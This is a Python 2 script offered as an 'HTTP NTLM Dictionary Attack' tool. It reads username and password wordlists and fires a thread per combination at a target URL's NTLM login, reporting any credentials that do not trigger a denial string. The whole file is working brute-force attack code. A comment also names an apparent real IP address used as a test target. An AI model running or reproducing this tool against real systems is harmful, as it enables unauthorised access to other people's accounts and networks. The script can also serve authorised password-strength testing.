import sys
import socket
import getopt  
import threading
import subprocess
import urllib2
import ssl
from urlparse import urlparse, urlunparse
from ntlm import HTTPNtlmAuthHandler

def usage():
    print
    print
    print
    print "**********************************************************************"
    print "*   HTTP NTLM Dictionary Attack or HNDAT v1 gregkcarson@gmail.com    *"
    print "----------------------------------------------------------------------"    
    print "'I thought what I'd do was, I'd pretend I was one of those deaf-mutes.'"
    print "----------------------------------------------------------------------"
    print
    print "ntlmdictauthpy.py targeturl domainname userlist passwordlist"
    print
    print "Userlist and Passwordlist must be in the same directory as ntlmdictauthpy.py python script."
    print
    print "Examples:"
    print
    print "ntlmdictauthpy.py http://ntlm-login-page.com/ userlist.txt passwordlist.txt "
    sys.exit(0)
 
def NTLMConnectBrute(url, username, password,denymessage):
    #print "Attempting NTLM Authentication with following settings:"
    #readlines and print used together prints extra blank line, strip the char
    url=url.rstrip('\n')
    #print url
    username=username.rstrip('\n')
    #print username
    password=password.rstrip('\n')
    #print password
    denymessage=denymessage.rstrip('\n')
    #print denymessage
    
    #NTLM Stuff
    #URLlib2 passmanager functionality
    passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
    passman.add_password(None,url,username,password)
    #NTLM Auth Handler
    auth_ntlm=HTTPNtlmAuthHandler.HTTPNtlmAuthHandler(passman)
    #open ntlm connection to target
    opener=urllib2.build_opener(auth_ntlm)
    urllib2.install_opener(opener)
    #get response from NTLM server
    responses=urllib2.urlopen(url)
    #print(responses.read())
    if denymessage in (responses.read()):
        pass
    else:
        print "[+] Successfully connected using username: "+username+" and password: "+password    
    return responses

def main():
    global targeturl
    global domainname
    global userlistfilename
    global passwordlistfilename
    #screenLock=Semaphore(Value=1)
    
    #read command line arguments
    if len(sys.argv)==5:
        targeturl=sys.argv[1]
        domainname=sys.argv[2]
        userlistfilename=sys.argv[3]
        passwordlistfilename=sys.argv[4]
    #if the length does not match then its either missing input or -h so print usage
    else:
        usage()
    print
    print
    print "**********************************************************************"
    print "*   HTTP NTLM Dictionary Attack or HNDAT v1 gregkcarson@gmail.com    *"
    print "----------------------------------------------------------------------"    
    print "'I thought what I'd do was, I'd pretend I was one of those deaf-mutes.'"
    print "----------------------------------------------------------------------"
    print
    
    #Display var's for user legibility
    print "Setting Target URL to: "+targeturl
    print "Setting Domain to: "+domainname
    print "Setting User list to: "+userlistfilename
    print "Setting Password list to: "+passwordlistfilename
    print
    print
    
    #do a try and error attempt here
    userlist = open(userlistfilename,'r').readlines()
    passwordlist = open(passwordlistfilename,'r').readlines()
    
    #Parse URL and determine Base URI in case user feeds long path
    parse_url = urlparse(targeturl)
    print "Parsed URL Values shown below"
    print parse_url
    print
    print
    #test against 209.171.47.212
    #Set Base URI for our NTLM connection
    base_uri=urlunparse((parse_url[0],parse_url[1],"","","",""))
    print "Base URI value shown below"
    print base_uri
    print
    print
    
    #Get the unique string the webserver issues if it does not approve auth attempt
    denystring = raw_input("Enter the unique string to indicate a denied attempt:")
    
    #Get user acceptance
    print
    userinput = raw_input("Would you like to run the dictionary attack(y/n)?")
    if userinput==("y"):
        print "[+] opening connection...."
    elif userinput==("y"):
        print "[+] opening connection...."
    elif userinput==("Yes"):
        print "[+] opening connection...."
    elif userinput==("yes"):
        print "[+] opening connection...."
    else:
        sys.exit(0)    
    
    #iterate through lists and attempt connections
    for line in userlist:
        user=domainname+'\\'+line
        for password in passwordlist:
            t = threading.Thread(target=NTLMConnectBrute,args=(base_uri,user,password,denystring))
            t.start()
            #print(response.read())

if __name__=='__main__':
    main()
